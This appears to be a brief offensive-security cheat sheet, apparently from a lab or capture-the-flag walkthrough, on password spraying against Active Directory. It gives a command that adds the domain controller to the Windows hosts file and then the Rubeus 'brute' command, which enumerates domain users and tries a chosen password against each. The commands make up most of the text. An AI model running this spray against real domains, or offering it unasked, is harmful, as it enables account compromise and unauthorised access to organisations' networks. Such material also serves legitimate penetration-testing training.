##### Requirements
Access to the AD (any)

##### Pre-attack
Firstly, add the IP of the Domain Controller to the Hosts file:
```
echo "IP CONTROLLER.local" >> C:\Windows\System32\drivers\etc\hosts
```
Note: Make sure this is correct, an incorrect hosts config will yield the `[X] Error resolving hostname 'CONTROLLER.local' to an IP address: No such host is known` error.

##### Attack
Rubeus.exe will look for users, then try the specified password.
```
Rubeus.exe brute /password:PASSWORD /noticket
```
